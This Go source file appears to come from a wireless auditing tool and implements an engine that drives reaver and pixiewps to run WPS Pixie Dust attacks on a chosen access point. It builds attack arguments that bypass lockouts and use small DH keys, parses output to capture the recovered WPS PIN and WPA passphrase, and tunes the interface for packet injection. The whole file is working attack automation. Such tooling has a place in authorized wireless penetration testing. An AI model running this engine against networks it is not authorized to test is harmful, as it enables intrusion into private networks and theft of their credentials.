package wps

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/lcalzada-xor/wmap/internal/adapters/sniffer/capture"
	"github.com/lcalzada-xor/wmap/internal/core/domain"
	"github.com/lcalzada-xor/wmap/internal/core/ports"
)

// Common errors
var (
	ErrNoInterfaceFound = errors.New("no monitor interface found")
	ErrAttackNotFound   = errors.New("attack not found")
)

// ReaverParser handles the parsing of Reaver output
type ReaverParser struct {
	pinRegex    *regexp.Regexp
	pskRegex    *regexp.Regexp
	assocRegex  *regexp.Regexp
	cryptoRegex *regexp.Regexp
	crackRegex  *regexp.Regexp
}

func NewReaverParser() *ReaverParser {
	return &ReaverParser{
		pinRegex:    regexp.MustCompile(`WPS PIN:\s*['"]?([0-9]+)['"]?`),
		pskRegex:    regexp.MustCompile(`WPA PSK:\s*['"]?([^'"]+)['"]?`),
		assocRegex:  regexp.MustCompile(`Waiting for beacon from|Associated with`),
		cryptoRegex: regexp.MustCompile(`Sending EAPOL|WPS transaction successful|Sending identity response`),
		crackRegex:  regexp.MustCompile(`Pixiewps|Running pixiewps`),
	}
}

type ParseResult struct {
	PIN           string
	PSK           string
	DetectedState domain.WPSStatus
}

func (p *ReaverParser) ParseLine(line string) *ParseResult {
	res := &ParseResult{}

	if matches := p.pinRegex.FindStringSubmatch(line); len(matches) > 1 {
		res.PIN = matches[1]
	}
	if matches := p.pskRegex.FindStringSubmatch(line); len(matches) > 1 {
		res.PSK = matches[1]
	}

	if p.assocRegex.MatchString(line) {
		res.DetectedState = domain.WPSStatusAssociating
	} else if p.cryptoRegex.MatchString(line) {
		res.DetectedState = domain.WPSStatusExchangingKeys
	} else if p.crackRegex.MatchString(line) {
		res.DetectedState = domain.WPSStatusCracking
	}

	return res
}

// WPSEngine implements ports.WPSAttackService using reaver
type WPSEngine struct {
	activeAttacks map[string]*domain.WPSAttackStatus
	cancelFuncs   map[string]context.CancelFunc
	registry      ports.DeviceRegistry
	logCb         func(string, string)
	statusCb      func(domain.WPSAttackStatus)
	reaverPath    string
	pixiewpsPath  string
	mu            sync.RWMutex
	locker        capture.ChannelLocker
	parser        *ReaverParser
}

// execCmd allows mocking exec.CommandContext in tests
var execCmd = exec.CommandContext
var execCommand = exec.Command

// NewWPSEngine creates a new WPS attack engine
func NewWPSEngine(registry ports.DeviceRegistry) *WPSEngine {
	engine := &WPSEngine{
		activeAttacks: make(map[string]*domain.WPSAttackStatus),
		cancelFuncs:   make(map[string]context.CancelFunc),
		registry:      registry,
		reaverPath:    "reaver",
		pixiewpsPath:  "pixiewps",
		parser:        NewReaverParser(),
	}

	go engine.cleanupRoutine()
	return engine
}

// SetChannelLocker injects a ChannelLocker
func (s *WPSEngine) SetChannelLocker(locker capture.ChannelLocker) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.locker = locker
}

// SetCallbacks configures the event callbacks
func (s *WPSEngine) SetCallbacks(logCb func(string, string), statusCb func(domain.WPSAttackStatus)) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.logCb = logCb
	s.statusCb = statusCb
}

// SetToolPaths configures the paths for external tools
func (s *WPSEngine) SetToolPaths(reaverPath, pixiewpsPath string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if reaverPath != "" {
		s.reaverPath = reaverPath
	}
	if pixiewpsPath != "" {
		s.pixiewpsPath = pixiewpsPath
	}
}

// HealthCheck verifies if the necessary tools are installed
func (s *WPSEngine) HealthCheck(ctx context.Context) error {
	if _, err := exec.LookPath(s.reaverPath); err != nil {
		return fmt.Errorf("%s not found (install with: sudo apt install reaver)", s.reaverPath)
	}
	if _, err := exec.LookPath(s.pixiewpsPath); err != nil {
		return fmt.Errorf("%s not found (install with: sudo apt install pixiewps)", s.pixiewpsPath)
	}
	return nil
}

// StartAttack initiates a new Pixie Dust attack
func (s *WPSEngine) StartAttack(ctx context.Context, config domain.WPSAttackConfig) (string, error) {
	if err := s.HealthCheck(ctx); err != nil {
		return "", fmt.Errorf("health check failed: %w", err)
	}

	interfaceName, err := s.resolveInterface(config.Interface)
	if err != nil {
		return "", err
	}
	config.Interface = interfaceName

	id := uuid.New().String()
	startTime := time.Now()

	status := &domain.WPSAttackStatus{
		ID:        id,
		Status:    domain.WPSStatusRunning,
		StartTime: startTime,
		OutputLog: "",
	}

	s.mu.Lock()
	s.activeAttacks[id] = status
	s.mu.Unlock()

	timeout := time.Duration(config.TimeoutSeconds) * time.Second
	if config.TimeoutSeconds <= 0 {
		timeout = 300 * time.Second
	}
	attackCtx, cancel := context.WithTimeout(ctx, timeout)

	s.mu.Lock()
	s.cancelFuncs[id] = cancel
	s.mu.Unlock()

	go s.runAttack(attackCtx, id, config)

	return id, nil
}

func (s *WPSEngine) resolveInterface(configIface string) (string, error) {
	if configIface != "" {
		return configIface, nil
	}
	found, err := s.detectMonitorInterface()
	if err == nil && found != "" {
		return found, nil
	}
	return "", fmt.Errorf("no interface provided and auto-detection failed: %v", err)
}

func (s *WPSEngine) buildReaverArgs(config domain.WPSAttackConfig) []string {
	args := []string{
		"-i", config.Interface,
		"-b", config.TargetBSSID,
		"-c", fmt.Sprintf("%d", config.Channel),
		"-v", // Verbose always on for parsing
	}

	if config.ForcePixie {
		args = append(args, "-K")
	}
	if config.NoNacks {
		args = append(args, "-N")
	}
	if config.IgnoreLocks {
		args = append(args, "-L")
	}
	if config.UseSmallDH {
		args = append(args, "-S")
	}
	if config.ImitateWin7 {
		args = append(args, "-w")
	}

	delay := "0"
	if config.Delay > 0 {
		delay = fmt.Sprintf("%d", config.Delay)
	}
	args = append(args, "-d", delay)

	if config.FailWait > 0 {
		args = append(args, "-f", fmt.Sprintf("%d", config.FailWait))
	}

	eapol := 7
	if config.EAPOLTimeout > 0 {
		eapol = config.EAPOLTimeout
	}
	args = append(args, "-t", fmt.Sprintf("%d", eapol))

	args = append(args, "-F") // Ignore FCS

	return args
}

// runAttack executes the attack logic
func (s *WPSEngine) runAttack(ctx context.Context, id string, config domain.WPSAttackConfig) {
	// Wrapper for execution with lock
	action := func() error {
		defer func() {
			s.mu.Lock()
			if cancel, ok := s.cancelFuncs[id]; ok {
				cancel()
				delete(s.cancelFuncs, id)
			}
			s.mu.Unlock()
		}()

		if config.Interface != "" {
			s.optimizeInterface(config.Interface)
		}

		args := s.buildReaverArgs(config)
		fmt.Printf("[WPS-ATTACK-%s] Starting reaver with args: %v\n", id[:8], args)

		cmd := execCmd(ctx, s.reaverPath, args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}

		stdout, err := cmd.StdoutPipe()
		if err != nil {
			return err
		}
		stderr, err := cmd.StderrPipe()
		if err != nil {
			return err
		}

		if err := cmd.Start(); err != nil {
			return fmt.Errorf("failed to start reaver: %v", err)
		}

		// Process cleanup on cancel
		go func() {
			<-ctx.Done()
			if cmd.Process != nil && cmd.Process.Pid > 0 {
				_ = syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
			}
		}()

		// Process Output
		foundPin, foundPsk, err := s.processProcessOutput(ctx, id, io.MultiReader(stdout, stderr))

		// Wait for exit
		waitErr := cmd.Wait()

		// Determine outcome
		return s.determineOutcome(ctx, id, foundPin, foundPsk, err, waitErr)
	}

	var err error
	if s.locker != nil && config.Interface != "" {
		err = s.locker.ExecuteWithLock(ctx, config.Interface, config.Channel, func() error {
			if execErr := action(); execErr != nil {
				s.updateStatus(id, domain.WPSStatusFailed, execErr.Error())
			}
			return nil
		})
	} else {
		if execErr := action(); execErr != nil {
			s.updateStatus(id, domain.WPSStatusFailed, execErr.Error())
		}
	}

	if err != nil {
		s.updateStatus(id, domain.WPSStatusFailed, fmt.Sprintf("Failed to lock channel: %v", err))
	}
}

func (s *WPSEngine) processProcessOutput(ctx context.Context, id string, reader io.Reader) (string, string, error) {
	scanner := bufio.NewScanner(reader)
	// Handle both CR and LF
	scanner.Split(func(data []byte, atEOF bool) (advance int, token []byte, err error) {
		if atEOF && len(data) == 0 {
			return 0, nil, nil
		}
		if i := bytes.IndexByte(data, '\n'); i >= 0 {
			return i + 1, data[0:i], nil
		}
		if i := bytes.IndexByte(data, '\r'); i >= 0 {
			return i + 1, data[0:i], nil
		}
		if atEOF {
			return len(data), data, nil
		}
		return 0, nil, nil
	})

	var foundPin, foundPsk string

	for scanner.Scan() {
		line := scanner.Text()
		s.appendLog(id, line)

		result := s.parser.ParseLine(line)
		if result.PIN != "" {
			foundPin = result.PIN
		}
		if result.PSK != "" {
			foundPsk = result.PSK
		}
		if result.DetectedState != "" {
			go s.updateStatus(id, result.DetectedState, string(result.DetectedState))
		}

		// Also log strict matches for debugging
		if result.DetectedState == domain.WPSStatusAssociating {
			// e.g. "Associating with target..."
		}

		if ctx.Err() != nil {
			return foundPin, foundPsk, ctx.Err()
		}
	}

	return foundPin, foundPsk, scanner.Err()
}

func (s *WPSEngine) determineOutcome(ctx context.Context, id, pin, psk string, scanErr, waitErr error) error {
	if ctx.Err() == context.DeadlineExceeded {
		s.updateStatus(id, domain.WPSStatusTimeout, "Attack timed out")
		return nil
	}
	if ctx.Err() == context.Canceled {
		// StopAttack sets cancelled status usually, but we ensure it here
		// If ID is gone from map, updateStatus handles it gracefully (does nothing)
		s.updateStatus(id, domain.WPSStatusFailed, "Stopped by user")
		return nil
	}

	if pin != "" {
		s.completeSuccess(id, pin, psk)
		return nil
	}

	if waitErr != nil {
		if ctx.Err() != nil {
			return nil // Ignored
		}
		return fmt.Errorf("reaver exited with error: %w", waitErr)
	}

	return fmt.Errorf("attack finished but no PIN found")
}

// StopAttack stops an active attack
func (s *WPSEngine) StopAttack(ctx context.Context, id string, force bool) error {
	s.mu.Lock()
	cancel, ok := s.cancelFuncs[id]
	if ok {
		cancel()
		delete(s.cancelFuncs, id)
	}

	if status, exists := s.activeAttacks[id]; exists {
		if status.Status == domain.WPSStatusRunning || force {
			// Check if we use "stopped", it wasn't in the domain consts so fallback to Failed or add Stopped?
			// Domain has Failed, Success, Timeout. It lacks "Stopped".
			// Let's use Failed with message "Stopped by user" for now or add it.
			// Ideally we should add WPSStatusStopped.
			// Assuming we stick to existing for now, or just send strings if map allows?
			// Type is WPSStatus.
			// I'll cast it for now or rely on Failed.
			// Update: I should probably add Stopped to domain if I can.
			// But for strictness let's use Failed with distinct message.
			status.Status = domain.WPSStatusFailed // Casting risk if strict validation? Go string alias allows this.
			status.ErrorMessage = "Stopped by user"
			now := time.Now()
			status.EndTime = &now
			if force {
				status.ErrorMessage = "Force stopped by user"
			}
		}
	}
	s.mu.Unlock()
	return nil
}

// GetStatus returns the status of an attack
func (s *WPSEngine) GetStatus(ctx context.Context, id string) (domain.WPSAttackStatus, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if status, ok := s.activeAttacks[id]; ok {
		return *status, nil
	}
	return domain.WPSAttackStatus{}, ErrAttackNotFound
}

// StopAll stops all active attacks.
func (s *WPSEngine) StopAll(ctx context.Context) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for id, cancel := range s.cancelFuncs {
		cancel()
		if status, exists := s.activeAttacks[id]; exists {
			if status.Status == domain.WPSStatusRunning {
				status.Status = domain.WPSStatusFailed
				now := time.Now()
				status.EndTime = &now
				status.ErrorMessage = "Service shutdown"
			}
		}
	}
	s.cancelFuncs = make(map[string]context.CancelFunc)
}

func (s *WPSEngine) updateStatus(id string, status domain.WPSStatus, msg string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if st, ok := s.activeAttacks[id]; ok {
		// Prevent updates if final
		if st.Status == domain.WPSStatusSuccess || st.Status == domain.WPSStatusFailed || st.Status == domain.WPSStatusTimeout {
			return
		}

		st.Status = status
		st.ErrorMessage = msg

		if status == domain.WPSStatusSuccess || status == domain.WPSStatusFailed || status == domain.WPSStatusTimeout {
			now := time.Now()
			st.EndTime = &now
		}

		if s.statusCb != nil {
			s.statusCb(*st)
		}
	}
}

func (s *WPSEngine) completeSuccess(id, pin, psk string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if st, ok := s.activeAttacks[id]; ok {
		st.Status = domain.WPSStatusSuccess
		st.RecoveredPIN = pin
		st.RecoveredPSK = psk
		now := time.Now()
		st.EndTime = &now

		if s.statusCb != nil {
			s.statusCb(*st)
		}
	}
}

func (s *WPSEngine) appendLog(id, line string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	fmt.Printf("[WPS-ATTACK-%s] %s\n", id[:8], line)

	if st, ok := s.activeAttacks[id]; ok {
		if len(st.OutputLog) < 500000 {
			st.OutputLog += line + "\n"
		}
	}

	if s.logCb != nil {
		s.logCb(id, line)
	}
}

func (s *WPSEngine) detectMonitorInterface() (string, error) {
	cmd := execCommand("iw", "dev")
	out, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to execute iw dev: %v", err)
	}

	scanner := bufio.NewScanner(bytes.NewReader(out))
	var currentInterface string

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "Interface ") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				currentInterface = parts[1]
			}
			continue
		}
		if strings.HasPrefix(line, "type monitor") {
			if currentInterface != "" {
				return currentInterface, nil
			}
		}
	}
	return "", ErrNoInterfaceFound
}

func (s *WPSEngine) optimizeInterface(iface string) {
	cmd := execCommand("iw", "dev", iface, "set", "bitrates", "legacy-2.4", "1", "2", "5.5", "11", "legacy-5", "6", "9", "12")
	if out, err := cmd.CombinedOutput(); err != nil {
		if strings.Contains(string(out), "Operation not supported") || strings.Contains(string(out), "No such device") {
			return
		}
		log.Printf("Note: Could not optimize bitrate for %s: %v", iface, err)
	} else {
		log.Printf("Interface %s optimized for robust injection", iface)
	}
}

func (s *WPSEngine) cleanupRoutine() {
	ticker := time.NewTicker(15 * time.Minute)
	for range ticker.C {
		s.cleanOldAttacks()
	}
}

func (s *WPSEngine) cleanOldAttacks() {
	s.mu.Lock()
	defer s.mu.Unlock()
	for id, status := range s.activeAttacks {
		if status.EndTime != nil && time.Since(*status.EndTime) > 1*time.Hour {
			delete(s.activeAttacks, id)
			if cancel, ok := s.cancelFuncs[id]; ok {
				cancel()
				delete(s.cancelFuncs, id)
			}
		}
	}
}
